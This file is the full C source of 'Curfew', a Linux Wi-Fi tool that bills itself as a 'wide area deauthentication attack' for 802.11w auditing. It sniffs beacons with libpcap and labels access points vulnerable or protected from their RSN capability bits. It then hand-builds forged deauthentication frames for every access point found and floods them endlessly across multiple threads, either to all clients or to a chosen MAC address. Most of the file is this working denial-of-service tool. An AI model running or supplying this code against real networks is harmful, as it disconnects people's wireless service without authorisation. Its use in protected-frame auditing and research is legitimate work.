/*
	MIT License

	Copyright (c) 2017 Ravjot Singh Samra

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>

#define VERSION "1.0"

/* Define the macros below as empty if you do not want forced colours. */
#define CYAN "\x1b[1;36m"
#define GREEN "\x1b[1;32m"
#define YELLOW "\x1b[1;33m"
#define RED "\x1b[1;31m"
#define COLOUR_RESET "\x1b[0m"

const unsigned char EXAMPLE___deauthFrame___[34] = /* Seems to be a proper packet, created manually by hand. */
{
	0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, /* 802.11 deauthentication frame (type 0, subtype 12). */

	0x52, 0x41, 0x56, 0x4A, 0x4F, 0x54, /* Destination/Receiver. */

	0x52, 0x41, 0x56, 0x4A, 0x4F, 0x54, /* Source/Sender. */

	0x52, 0x41, 0x56, 0x4A, 0x4F, 0x54, /* Management frame's BSSID/Access Point. */

	0x00, 0x00,

	0x01, /* Reason code for deauthentication. https://www.cisco.com/assets/sol/sb/WAP371_Emulators/WAP371_Emulator_v1-0-1-5/help/Apx_ReasonCodes2.html . 0x01 is "unspecified". */

	0x00
};

unsigned char frameStart[18] =
{
	0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 

	0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF /* Address initially set to broadcast for all client deauthentication. */
};

unsigned char targets[100][12]; /* Array for avoiding duplication in prepared packet array, so all APs get equal deauth packets per iteration of the final array. */

const unsigned char frameEnd[4] =
{
	0x00, 0x00, 0x23, 0x00 /* Reason code is set to 0x23 for "authentication failure". Doesn't matter what's here, it works no matter which reason I believe. */
};

unsigned char frameFinal[100][34]; /* Stores full packets with address 2 and address 3 of the frame changed. Done so less `memcpy` functions are needed; although more memory is required to store the elements, it's faster. */

pcap_t *handle; /* Handle for the PCAP device which will be our WLAN adapter/card. */
struct bpf_program filter;
char filter_exp[] = "type mgt subtype beacon"; /* BPF (packet filter) for beacons only (type 0, subtype 8). */

int exiting; /* Should be defined as 0 by default due to scope. */

unsigned int i; /* Counter for how many unique frames have been created and are being sent. */
unsigned int d; /* Unsigned integer loop variable. */
int c; /* Signed integer loop variable. */

unsigned int captureLimit; /* Amount of targets to capture, unsigned or signed doesn't matter, never going to catch that many APs anyway. */
int captureLimitRetry; /* Restarts capture when limit reached. */

unsigned int ignoredAP[6];
int ignoreAP;

int showMoreInfo; /* Must be set to anything other than zero to do what it is named. */

struct __attribute__((__packed__))RSN
{
/* Max Bytes: */
	/* 1 */    unsigned char RSNtag;
	/* 1 */    unsigned char RSNlength; /* Place to store the tag's length in. */
	/* 2 */    unsigned char RSNversion; /* Double checks if we have actually found an RSN tag and not just a byte that is 0x30 with some supposed "length". */
	/* 4 */    unsigned char groupDataCipherSuite[4]; /* Got to parse the entire packet to avoid PMK caching giving false RSN capability results */
	/* 2 */    unsigned char pairwiseCipherSuiteCount; /* Same as above for all counts. */
	/* 4 */    unsigned char pairwiseCipherSuiteList; /* Unused. */
	/* 2 */    unsigned char AKMcipherSuiteCount;
	/* 4 */    unsigned char AKMcipherSuiteList; /* Unused. */
	/* 2 */    unsigned char RSNcapabilities; /* First byte contains required or capable values for frame management protection AKA what we want. Ignore everything after this. */
	/* 2 */    unsigned char PMKIDcount; /* PMK caching seems to be only used in enterprise 802.11 APs? */
	/* 16 */   unsigned char PMKIDlist;
};

void beaconCapture(__attribute__((unused))unsigned char *args, const struct pcap_pkthdr *header, const unsigned char *beaconCaptured) /* Packet handler. */
{
	const unsigned char *target;
	const unsigned char *targetName;
	const unsigned char *targetNameLength;
	struct RSN parser;
	int packetSize; /* Required to "scan" the entire packet for the RSN tag. */
	int RSNabsent; /* RSN information is not a required field for beacon frames. */
	int protection[7]; /* Stores the binary dump of the first `RSNcapabilities` byte. May as well store the entire thing to show the user too. */

	target = beaconCaptured + beaconCaptured[2] + 10; /* Third byte is the length of the Radiotap header, we get that out of the way so we can find the BSSID we want in the IP header. */
	targetName = beaconCaptured + beaconCaptured[2] + 38; /* Same with the other one, except going to the WLAN ESSID offset. */
	targetNameLength = beaconCaptured + beaconCaptured[2] + 37; /* To properly print the ESSID, you must need the length, or else garbage obviously appears with it. */
	packetSize = header -> caplen; /* `len` and `caplen` seem to not make a difference in the end? Using `caplen` probably makes parsing faster as it shows what was actually captured of the packet? */

	if(exiting == 1)
	{
		return;
	}

	if(ignoreAP == 1)
	{
		for(d = 0; d < 6; ++d)
		{
			if(memcmp(&ignoredAP[d], &target[d], 1) != 0)
			{
				break;
			}

			return;
		}
	}

	for(d = 0; d < i; ++d) /* Avoids duplication. Important for no target discrimination and from not eventually going out of array bounds due to dupes (in certain time without reset). */
	{
		if(memcmp(targets[d], target, 6) == 0) /* Only compares 6 bytes of packet, address 2 and address 3 are the same in the end (so 6 instead of 12 saves memory and is faster). */
		{
			return; /* Returns from the function and discards the packet if address is found in array. */
		}
	}

	memcpy(targets[i], target, 6); /* If above does not return, then the newly introduced/found BSSID copied here. It will be checked for duplication in the next loop above. */

	for(c = 0; c < packetSize; ++c)
	{
		if(beaconCaptured[c] == 0x30 && beaconCaptured[c + 2] == 0x01)
		{
			/* TODO: Can this be made anymore readable, better, and easier to follow? */
			parser.RSNtag = beaconCaptured[c];
			parser.RSNlength = beaconCaptured[c + 1]; /* This assumes all bytes that equal 0x30 or 48 are RSN tags and therefore have the RSN length right after it. Not good; hence why the version byte check below. */
			parser.RSNversion = beaconCaptured[c + 2] + beaconCaptured[c + 3]; /* Only Version 1 exists, so this must always equal 0x01. Second byte is reserved/unused in RSN's standard. */

			parser.groupDataCipherSuite[0] = beaconCaptured[c + 4]; /* Each byte does not add up, they are unique and "joined" together, hence why the array is needed. */
			parser.groupDataCipherSuite[1] = beaconCaptured[c + 5]; /* Not used, but done anyway! Speed shouldn't be affected noticeably. */
			parser.groupDataCipherSuite[2] = beaconCaptured[c + 6];
			parser.groupDataCipherSuite[3] = beaconCaptured[c + 7];

			parser.pairwiseCipherSuiteCount = beaconCaptured[c + 8] + beaconCaptured[c + 9]; /* This and the below list counts must be done correctly, or you will not get the RSN capabilities byte we want. */
			parser.AKMcipherSuiteCount = beaconCaptured[c + 10 + (parser.pairwiseCipherSuiteCount * 4)]; /* Unlike the above, this only gets one of the bytes, I think. Practically irrelevant. */

			parser.RSNcapabilities = beaconCaptured[c + 16 + (parser.AKMcipherSuiteCount * 4)]; /* There's actually two bytes for RSN capabilities, but the part we're after is in the first one, second one is irrelevant. */

			RSNabsent = 0;
			break;
		}
		else
		{
			RSNabsent = 1;
		}
	}

	if(RSNabsent == 0)
	{
		for(c = 7; c >= 0; --c)
		{
			protection[c] = (parser.RSNcapabilities & (1 << c)) != 0;
		}

	}

	if(showMoreInfo != 0) /* For the sake of formatting. */
	{
		printf("=====================================================================================================\n");
	}
	else
	{
		printf("==============================================================\n");
	}


	if(*targetNameLength > 0x00)
	{
		if(protection[6] == 1)
		{
			printf(RED "ESSID: " COLOUR_RESET);

			for(d = 0; d <= *targetNameLength; ++d)
			{
				printf(RED "%c" COLOUR_RESET, targetName[d]);
			}
		}
		else if(protection[7] == 1 || RSNabsent == 1)
		{
			printf(YELLOW "ESSID: " COLOUR_RESET);

			for(d = 0; d <= *targetNameLength; ++d)
			{
				printf(YELLOW "%c" COLOUR_RESET, targetName[d]);
			}
		}
		else
		{
			printf(GREEN "ESSID: " COLOUR_RESET);

			for(d = 0; d <= *targetNameLength; ++d)
			{
				printf(GREEN "%c" COLOUR_RESET, targetName[d]);
			}
		}
	}
	else
	{
		printf(YELLOW "ESSID: <Hidden>" COLOUR_RESET);
	}

	if(RSNabsent == 1)
	{
		printf(YELLOW "\nBSSID: %02X:%02X:%02X:%02X:%02X:%02X | ?? - RSN Is Absent |" COLOUR_RESET, target[0], target[1], target[2], target[3], target[4], target[5]);
	}
	else if(protection[6] == 1) /* 0x40 or 0100 0000 (logically it is 1100 0000). The Required field, meaning it's also Capable if Required! Check before Capable. */
	{
		printf(RED "\nBSSID: %02X:%02X:%02X:%02X:%02X:%02X | %d%d - Invulnerable AP |" COLOUR_RESET, target[0], target[1], target[2], target[3], target[4], target[5], protection[7], protection[6]);
	}
	else if(protection[7] == 1) /* 0x80 or 1000 0000. The Capable field. */
	{
		printf(YELLOW "\nBSSID: %02X:%02X:%02X:%02X:%02X:%02X | %d%d - Depends On STA |" COLOUR_RESET, target[0], target[1], target[2], target[3], target[4], target[5], protection[7], protection[6]);
	}
	else
	{
		printf(GREEN "\nBSSID: %02X:%02X:%02X:%02X:%02X:%02X | %d%d - Vulnerable AP |" COLOUR_RESET, target[0], target[1], target[2], target[3], target[4], target[5], protection[7], protection[6]);
	}

	memcpy(frameFinal[i], frameStart, 18);
	memcpy(frameFinal[i] + 18, target, 12); /* Can be target or targets[i], must be 12 bytes to include all required addresses in frame. */
	memcpy(frameFinal[i] + 30, frameEnd, 4);

	printf(" Target(n): %d\n", ++i); /* The packet counter `i` increases here! Keep track of it before modification. */

	if(showMoreInfo != 0)
	{
		if(RSNabsent == 0)
		{
			printf("RSN Tag: %d | RSN Length: %d | RSN Version: %d (Should Equal 1) | RSN Capabilities First Hex Byte: %02X\n", parser.RSNtag, parser.RSNlength, parser.RSNversion, parser.RSNcapabilities);
			printf("RSN Capabilities First Hex Byte Binary Dump: %d%d%d%d %d%d%d%d\n", protection[7], protection[6], protection[5], protection[4], protection[3], protection[2], protection[1], protection[0]);
		}
		else
		{
			printf("RSN Tag: NULL\n");
			printf("RSN Information Is Seemingly Absent In This Beacon Frame\n");
		}
	}

	return;
}


void stop(__attribute__((unused))int args) /* Signal Interrupt (CTRL + C) handler. With a regular SIGINT exit and without this handler, it can mess up your interface and require a reset during usage. */
{
	printf("\nINFO: Exiting...\n");
	captureLimit = 0;
	exiting = 1;
	pcap_breakloop(handle);
}


void *capture(__attribute__((unused))void *args) /* Thread function containing packet capture function. */
{
	signal(SIGINT, stop);

	while(exiting == 0)
	{
		while(i < captureLimit)
		{
			pcap_loop(handle, 1, beaconCapture, NULL);
		}

		if(exiting != 0)
		{
			printf(GREEN "\nSUCCESS: Exited Curfew\n\n" COLOUR_RESET);
			pthread_exit(NULL);
		}
		else if(captureLimitRetry == 0)
		{
			printf("\nINFO: Capture Limit %d Reached, Stopping Capture\n\n", captureLimit);
			pthread_exit(NULL);
		}
		else if(captureLimitRetry != 0)
		{
			printf("\nINFO: Capture Limit %d Reached, Restarting Capture\n\n", captureLimit);
			i = 0;
		}
		else /* Triggers if max unsigned int limit is reached, so this is pretty much useless. */
		{
			pthread_exit(NULL);
		}
	}

	pthread_exit(NULL);
}


void *attack(__attribute__((unused))void *args) /* Thread function for simply sending packets endlessly. */
{
	unsigned int loop; /* Must be unsigned to match `i`, which is also unsigned. */

	signal(SIGINT, stop);

	/* TODO: Create command line options to run attack for certain length of time instead of infinite loop. */
	while(exiting == 0)
	{
		for(loop = 0; loop < i; ++loop)
		{
			/* TODO: Use raw sockets instead of libpcap's TX function, should be much faster that way for a flood. */
			pcap_sendpacket(handle, frameFinal[loop], 34); /* Iterates through main array. */
		}
	}

	pthread_exit(NULL);
}


int main(int argc, char *argv[]) 
{
	int argi;
	char *device;
	char errorBuffer[PCAP_ERRBUF_SIZE];
	unsigned int addressMAC[6]; /* Used to get STA MAC from `argv` and put it into `frameStart` without type errors/warnings. Remember the null terminator at the end! */

	int cores; /* Core identifier. First core is core 0, second core is core 1 etc. */
	int trueCores; /* Core amount. E.g. core 0 and core 1 is a dual core system, so 2 true cores.*/
	int t; /* Use this for thread management, so to keep track of pthread loops. */
	int ceaseFire; /* Stops attack threads from being created. */

	struct sched_param schedParam; /* Used to store the priority number of the scheduling policy and only that. */
	char schedPolicy; /* Scheduling policies have a byte value, e.g. `SCHED_FIFO` is actually a preprocessor macro that means 1. Check "include uapi/linux/sched.h" for recent kernels, or "include linux/sched.h" for older ones. */
	char schedPolicyName[10]; /* Again, policies are truly bytes, http://www.linuxjournal.com/article/3910, so this is used to identify which policy is intended. */

	int dlt; /* Used to determine if WLAN device is using Radiotap headers or not, very important the user knows. */
	const char *dltName;
	const char *dltDesc;
	char subsist; /* Only used for the continue question if DLT isn't 127/Radiotap. */

	pthread_t threads[1]; /* I'm using C89, not C99. We simply make it bigger later on, but you can even remove that and make this a large amount e.g. 100 if lazy. */
	cpu_set_t cpuset;
	pthread_attr_t threadAttribute;
	pthread_attr_init(&threadAttribute);

	device = pcap_lookupdev(errorBuffer); /* Default device. Would it be better if it was `wlan0` instead? Ethernet devices likely get caught in this. */
	cores = 2; /* Set to 2 `trueCores` for the `threads` array C89 workaround by default, this is actually 3 cores but this crossover of both variables happens only once. */
	captureLimit = -1; /* No actual default limit, but technically the max size of an unsigned integer as it overflows to the max size itself. Only guaranteed for unsigned int. */
	schedPolicy = SCHED_OTHER;
	strcpy(schedPolicyName, "SCHED_OTHER"); /* This is the default scheduling policy. */

	for(argi = 0; argi < argc; ++argi)
	{
		if(argc == 1 || strcmp(argv[argi], "-h") == 0 || strcmp(argv[argi], "--help") == 0)
		{
			putchar('\n');
			printf(" | Program:  Curfew\n");
			printf(" | Version:  %s\n", VERSION);
			printf(" | Purpose:  Wide Area Deauthentication Attack For IEEE 802.11w-2009 Auditing\n");
			printf(" | Author:   Ravjot Singh Samra (ravss@live.com)\n");

			putchar('\n');
			printf(" |  Command-Line Options:\n");
			printf(" |    -d | e.g. curfew -d wlan0 | Default - PCAP Chooses\n");
			printf(" |         Specify Which Wireless Interface Should The Program Use\n");
			printf(" |         You Should Always Specify This Unless You Only Have A Single Network Device (That Is Wireless)\n");

			putchar('\n');
			printf(" |    -c | e.g. curfew -c 4 | Default - 2 Cores\n");
			printf(" |         Specify The Amount Of Cores In Current System To Create Threads On (1:1)\n");
			printf(" |         Single Core Not Recommended\n");

			putchar('\n');
			printf(" |    -v | e.g. curfew -v 1 | Default - 0\n");
			printf(" |         Shows Extra Information Regarding Management Frame Protection\n");
			printf(" |         Provides Information On The RSN Tag, Packet Size, And RSN Capabilities Binary Dump (First Byte)\n");

			putchar('\n');
			printf(" |    -s | e.g. curfew -s SCHED_RR | Default - SCHED_OTHER\n");
			printf(" |         Specify The Scheduling Policy To Use (Linux Specific, Can Depend On Kernel Version)\n");
			printf(" |         Stay With SCHED_OTHER (Linux Default) If Trouble Is Occurring\n");
			printf(" |         SCHED_FIFO - SCHED_RR - SCHED_OTHER - SCHED_IDLE - SCHED_BATCH, Case Insensitive\n");

			putchar('\n');
			printf(" |    -p | e.g. curfew -p 28 | Default - MAX\n");
			printf(" |         Specify The Scheduling Priority (Real-Time)\n");
			printf(" |         Only Useful For SCHED_FIFO And SCHED_RR From 1 To 99 Or MIN/min To MAX/max\n");
			printf(" |         Select 20 To 40 If Trouble Is Occurring\n");

			putchar('\n');
			printf(" |    -l | e.g. curfew -l 30 | Default - No Limit\n");
			printf(" |         Specify The Amount Of APs To Capture\n");

			putchar('\n');
			printf(" |    -lr | e.g. curfew -lr | Default - No Retry\n");
			printf(" |         Clears Collection When `-l` Is Reached And Restarts Capture\n");
			printf(" |         Useful For Roaming\n");

			putchar('\n');
			printf(" |    -m | e.g. curfew -m 01:02:03:04:05:06 | Default - FF:FF:FF:FF:FF:FF (Broadcast)\n");
			printf(" |         Specify The Client To Deauthenticate\n");

			putchar('\n');
			printf(" |    -i | e.g. curfew -m AA:BB:CC:DD:EE:FF | Default - Nothing Ignored\n");
			printf(" |         Specify The AP To Ignore\n");

			putchar('\n');
			printf(" |    --ceasefire | e.g. curfew --ceasefire\n");
			printf(" |         Only Captures, Does Not Deauthenticate Anything\n");
			printf(" |         Requires Only A Single Core\n");

			putchar('\n');
			printf(" |    -h | --help | e.g. curfew -h\n");
			printf(" |         Displays This Output Alone\n");

			putchar('\n');
			return EXIT_SUCCESS;
		}
	}

	if(geteuid() != 0)
	{
		fprintf(stderr, RED "\nCRITICAL FAILURE: This Program Requires Root Privileges For PCAP, Please Use Sudo\n\n" COLOUR_RESET);
		return EXIT_FAILURE;
	}
	else
	{
		printf(GREEN "\nSUCCESS: Starting...\n\n");
	}

	for(argi = 1; argi < argc; ++argi)
	{
		if(strcmp(argv[argi], "-d") == 0)
		{
			device = argv[argi + 1];
		}

		if(strcmp(argv[argi], "-c") == 0)
		{
			cores = atoi(argv[argi+1]);

			if(cores < 1)
			{
				fprintf(stderr, YELLOW "WARNING: Zero Cores Explicitly Specified, Carrying On With One Core\n" COLOUR_RESET);
			}
		}

		if(strcmp(argv[argi], "-v") == 0)
		{
			showMoreInfo = atoi(argv[argi+1]);
		}
		
		if(strcmp(argv[argi], "--ceasefire") == 0)
		{
			ceaseFire = 1;
		}

		if(strcmp(argv[argi], "-s") == 0)
		{
			strcpy(schedPolicyName, argv[argi + 1]);

			if(strcmp(argv[argi + 1], "SCHED_OTHER") == 0 || strcmp(argv[argi + 1], "sched_other") == 0)
			{
				schedPolicy = SCHED_OTHER;
			}
			else if(strcmp(argv[argi + 1], "SCHED_FIFO") == 0 || strcmp(argv[argi + 1], "sched_fifo") == 0)
			{
				schedPolicy = SCHED_FIFO;
			}
			else if(strcmp(argv[argi + 1], "SCHED_RR") == 0 || strcmp(argv[argi + 1], "sched_rr") == 0)
			{
				schedPolicy = SCHED_RR;
			}
			else if(strcmp(argv[argi + 1], "SCHED_BATCH") == 0 || strcmp(argv[argi + 1], "sched_batch") == 0)
			{
				schedPolicy = SCHED_BATCH;
			}
			else if(strcmp(argv[argi + 1], "SCHED_IDLE") == 0 || strcmp(argv[argi + 1], "sched_idle") == 0)
			{
				schedPolicy = SCHED_IDLE;
			}
			else
			{
				strcpy(schedPolicyName, "SCHED_OTHER"); /* Declared again if the previous `strcpy` function copied junk into the variable. */
				fprintf(stderr, YELLOW "WARNING: Scheduling Policy Not Recognized, Continuing With %s\n" COLOUR_RESET, schedPolicyName);
			}
		}

		if(strcmp(argv[argi], "-l") == 0)
		{
			captureLimit = atoi(argv[argi+1]);
		}

		if(strcmp(argv[argi], "-lr") == 0)
		{
			captureLimitRetry = 1;
		}

		if(strcmp(argv[argi], "-m") == 0)
		{
			sscanf(argv[argi + 1], "%02X:%02X:%02X:%02X:%02X:%02X", &addressMAC[0], &addressMAC[1], &addressMAC[2], &addressMAC[3], &addressMAC[4], &addressMAC[5]);

			for(t = 0; t <= 5; ++t)
			{
				frameStart[12 + t] = addressMAC[0 + t];
			}

			printf(GREEN "SUCCESS: Targeted Client MAC Set To %02X:%02X:%02X:%02X:%02X:%02X\n" COLOUR_RESET, addressMAC[0], addressMAC[1], addressMAC[2], addressMAC[3], addressMAC[4], addressMAC[5]);
		}
	}

	schedParam.sched_priority = sched_get_priority_min(schedPolicy); /* Default is minimum priority. */

	for(argi = 1; argi < argc; ++argi)
	{
		if(strcmp(argv[argi], "-p") == 0) /* Priority number must be set after `SCHED_POLICY` has been set, as different policies have different scheduling priority limits/ranges. */
		{
			/* TODO: Perhaps stop with the multiple `sched_get...` functions and just assign it to a int variable instead? */
			if(atoi(argv[argi + 1]) >= sched_get_priority_min(schedPolicy) && atoi(argv[argi + 1]) <= sched_get_priority_max(schedPolicy))
			{
				schedParam.sched_priority = atoi(argv[argi + 1]);
			}
			else if(atoi(argv[argi + 1]) < sched_get_priority_min(schedPolicy) || atoi(argv[argi + 1]) > sched_get_priority_max(schedPolicy))
			{
				fprintf(stderr, YELLOW "WARNING: Scheduling Priority %s Is Outside Range Of Scheduling Policy (%d to %d), Continuing With Default\n" COLOUR_RESET, argv[argi + 1], sched_get_priority_min(schedPolicy), sched_get_priority_max(schedPolicy));
				schedParam.sched_priority = sched_get_priority_min(schedPolicy);
			}
			else if(strcmp(argv[argi + 1], "MAX") == 0 || strcmp(argv[argi + 1], "max") == 0)
			{
				schedParam.sched_priority = sched_get_priority_max(schedPolicy);
			}
			else if(strcmp(argv[argi + 1], "MIN") == 0 || strcmp(argv[argi + 1], "min") == 0)
			{
				schedParam.sched_priority = sched_get_priority_min(schedPolicy);
			}
			else
			{
				fprintf(stderr, YELLOW "WARNING: Scheduling Priority Value Not Recognized, Continuing With Default\n" COLOUR_RESET);
			}

			break;
		}
	}

	for(argi = 1; argi < argc; ++argi)
	{
		if(strcmp(argv[argi], "-i") == 0) /* Reuses `addressMAC` for ignoring a BSSID. Must be done in a different loop to `-m`. */
		{
			ignoreAP = 1;
			sscanf(argv[argi + 1], "%02X:%02X:%02X:%02X:%02X:%02X", &addressMAC[0], &addressMAC[1], &addressMAC[2], &addressMAC[3], &addressMAC[4], &addressMAC[5]);

			for(t = 0; t <= 5; ++t)
			{
				ignoredAP[t] = addressMAC[t];
			}

			printf(GREEN "SUCCESS: Ignored BSSID Set To %02X:%02X:%02X:%02X:%02X:%02X\n" COLOUR_RESET, ignoredAP[0], ignoredAP[1], ignoredAP[2], ignoredAP[3], ignoredAP[4], ignoredAP[5]);
		}
	}

	threads[0] = 0 + cores * sizeof(pthread_t); /* Creates less unused threads, as opposed to just creating 100 potential threads in the array and only using as many as needed. */
	t = 0;
	trueCores = 0; /* `t` refers to the core 0, not the amount, unlike `trueCores`. */

/*	printf("\nDevice: %s - Cores: %d - Extra Info: %d - Sched_Policy: %d - Sched_Priority: %d - CaptureLimit: %d -Sched_Name: %s\n\n", device, cores, showMoreInfo, schedPolicy, schedParam.sched_priority, captureLimit, schedPolicyName); */
/*	Debug purposes only (for checking most command line arguments). */

	handle = pcap_create(device, errorBuffer);
	pcap_set_buffer_size(handle, 67108864);
	pcap_set_snaplen(handle, 1024);
	pcap_set_timeout(handle, 1000);

	if(pcap_set_promisc(handle, 1) == 0)
	{
		printf(GREEN "SUCCESS: Promiscuous Mode Set\n" COLOUR_RESET);
	}
	else
	{
		pcap_set_promisc(handle, 0);
		fprintf(stderr, RED "FAILURE: Promiscuous Mode Set Failed | PCAP ERROR: '%s'\n" COLOUR_RESET, pcap_geterr(handle));
	}

	if(pcap_can_set_rfmon(handle) == 1)
	{
		printf(GREEN "SUCCESS: Monitor Mode Supported By %s\n" COLOUR_RESET, device);
	}
	else
	{
		fprintf(stderr, RED "CRITICAL FAILURE: Monitor Mode Not Supported, Impossible To Use This Program | PCAP ERROR: '%s'\n" COLOUR_RESET, pcap_geterr(handle));
		return EXIT_FAILURE;
	}

	if(pcap_set_rfmon(handle, 1) == 0)
	{
		printf(GREEN "SUCCESS: Monitor Mode Set\n" COLOUR_RESET);
	}
	else
	{
		fprintf(stderr, RED "CRITICAL FAILURE: Monitor Mode Set Failed | PCAP ERROR: '%s'\n" COLOUR_RESET, pcap_geterr(handle));
		return EXIT_FAILURE;
	}

	if(pcap_activate(handle) == 0)
	{
		printf(GREEN "SUCCESS: Device Handle Activated\n" COLOUR_RESET);
	}
	else
	{
		fprintf(stderr, RED "CRITICAL FAILURE: Device Handle Failure | PCAP ERROR: '%s'\n" COLOUR_RESET, pcap_geterr(handle));
		return EXIT_FAILURE;
	}

	dlt = pcap_datalink(handle);
	dltName = pcap_datalink_val_to_name(dlt);
	dltDesc = pcap_datalink_val_to_description(dlt);

	if(dlt == 127)
	{
		printf(GREEN "SUCCESS: Correct DLT (%d %s %s)\n" COLOUR_RESET, dlt, dltName, dltDesc);
	}
	else
	{
		fprintf(stderr, YELLOW "FAILURE: Incorrect DLT (%d %s %s)\n" COLOUR_RESET, dlt, dltName, dltDesc);
		printf("INFO: DLT Should Be (127 IEEE802_11_RADIO 802.11 plus radiotap header)\n");
		printf("INFO: Continue Regardless? Y Or N\n");
		scanf(" %s", &subsist);

		for( ; ; )
		{
			if((strcmp(&subsist, "y") == 0) || (strcmp(&subsist, "Y") == 0) || (strcmp(&subsist, "yes") == 0) || (strcmp(&subsist, "Yes") == 0) || (strcmp(&subsist, "YES") == 0))
			{
				fprintf(stderr, YELLOW "WARNING: Going Ahead, Extremely Unlikely To Work Due To Packet Structure Including Radiotap Header\n" COLOUR_RESET);
				break;
			}
			else if((strcmp(&subsist, "n") == 0) || (strcmp(&subsist, "N") == 0) || (strcmp(&subsist, "no") == 0) || (strcmp(&subsist, "No") == 0) || (strcmp(&subsist, "NO") == 0))
			{
				return EXIT_FAILURE;
			}
			else
			{
				printf("INFO: Please Enter Y Or N\n");
			}
		}
	}

	if(pcap_compile(handle, &filter, filter_exp, 0, 0) == 0) 
	{
		printf(GREEN "SUCCESS: Beacon Filter Created\n" COLOUR_RESET);
	}
	else
	{
		fprintf(stderr, RED "CRITICAL FAILURE: Beacon Filter Creation Failure | PCAP ERROR: '%s'\n" COLOUR_RESET, pcap_geterr(handle));
		return EXIT_FAILURE;
	}

	if(pcap_setfilter(handle, &filter) == 0) 
	{
		printf(GREEN "SUCCESS: Beacon Filter Activated\n" COLOUR_RESET);
	}
	else
	{
		fprintf(stderr, RED "CRITICAL FAILURE: Beacon Filter Activation Failure | PCAP ERROR: '%s'\n" COLOUR_RESET, pcap_geterr(handle));
		return EXIT_FAILURE;
	}

	CPU_ZERO(&cpuset);
	CPU_SET(t, &cpuset);
	pthread_attr_setaffinity_np(&threadAttribute, sizeof(cpu_set_t), &cpuset); /* Capture thread always pins to first core. */

	if(pthread_attr_setinheritsched(&threadAttribute, PTHREAD_EXPLICIT_SCHED) == 0)
	{
		printf(GREEN "SUCCESS: Manual Scheduling Policy Change Possible\n" COLOUR_RESET);

		if(pthread_attr_setschedpolicy(&threadAttribute, schedPolicy) == 0)
		{
			printf(GREEN "SUCCESS: Scheduling Policy Manually Set To %s\n" COLOUR_RESET, schedPolicyName);
		}
		else
		{
			fprintf(stderr, RED "FAILURE: Could Not Set %d As Scheduling Policy\n" COLOUR_RESET, schedPolicy);
		}
	}
	else
	{
		fprintf(stderr, RED "FAILURE: Unable To Manually Set Scheduling Policy\n" COLOUR_RESET);
	}

	if(pthread_attr_setschedparam(&threadAttribute, &schedParam) == 0)
	{
		printf(GREEN "SUCCESS: Thread Priority Is %d\n" COLOUR_RESET, schedParam.sched_priority);
	}

	if(cores <= 1 || ceaseFire == 1) /* Creates both functions on lone core if only one is supplied or is needed. */
	{
		if(pthread_create(&threads[0], &threadAttribute, capture, NULL) == 0)
		{
			printf(GREEN "         SUCCESS: Thread %d Created (Capture) On The Single Core\n" COLOUR_RESET, ++trueCores);

			if(ceaseFire == 1)
			{
				pthread_join(threads[0], NULL);
				return EXIT_SUCCESS;
			}
		}
		else
		{
			fprintf(stderr, RED "         CRITICAL FAILURE: Thread %d (Capture) Failed To Create On The Single Core\n" COLOUR_RESET, ++trueCores);
			return EXIT_FAILURE;
		}

		if(pthread_create(&threads[1], &threadAttribute, attack, NULL) == 0)
		{
			printf(GREEN "         SUCCESS: Thread %d Created (Attack) On The Single Core\n" COLOUR_RESET, ++trueCores);
			pthread_join(threads[0], NULL);
			pthread_join(threads[1], NULL);
			return EXIT_SUCCESS;
		}
		else
		{
			fprintf(stderr, RED "         CRITICAL FAILURE: Thread %d (Attack) Failed To Create On The Single Core\n" COLOUR_RESET, ++trueCores);
			return EXIT_FAILURE;
		}

	}

	if(pthread_create(&threads[t], &threadAttribute, capture, NULL) == 0)
	{
		printf(GREEN "         SUCCESS: Thread %d Created (Capture) On Core %d\n" COLOUR_RESET, ++trueCores, t);
	}
	else
	{
		fprintf(stderr, RED "         CRITICAL FAILURE: Thread %d (Capture) Failed To Create On Core %d\n" COLOUR_RESET, ++trueCores, t);
		return EXIT_FAILURE;
	}

	for(t = 1; t < cores; ++t) /* `t` is 1 because core 0 is exclusively for capturing, not attacking. */
	{
		CPU_ZERO(&cpuset);
		CPU_SET(t, &cpuset);
		pthread_attr_setaffinity_np(&threadAttribute, sizeof(cpu_set_t), &cpuset);

		if(pthread_create(&threads[t], &threadAttribute, attack, NULL) == 0)
		{
			printf(GREEN "         SUCCESS: Thread %d Created (Attack) On Core %d\n" COLOUR_RESET, ++trueCores, t);
		}
		else
		{
			fprintf(stderr, YELLOW "         WARNING: System Only Has %d/%d Actual Cores, Cannot Create Thread %d+\n" COLOUR_RESET, trueCores, cores, t);
			break;
		}
	}

	for(t = 0; t <= cores; ++t) /* I believe this loop for `pthread_join` is useless, as the thread functions never terminate in the first place. */
	{
		pthread_join(threads[t], NULL); /* Only a single thread must be joined so `int main` does not close prematurely and kill our created threads. Joining all anyway because why not? */
	}

	pcap_freecode(&filter);
	pcap_close(handle);
	return EXIT_SUCCESS;
}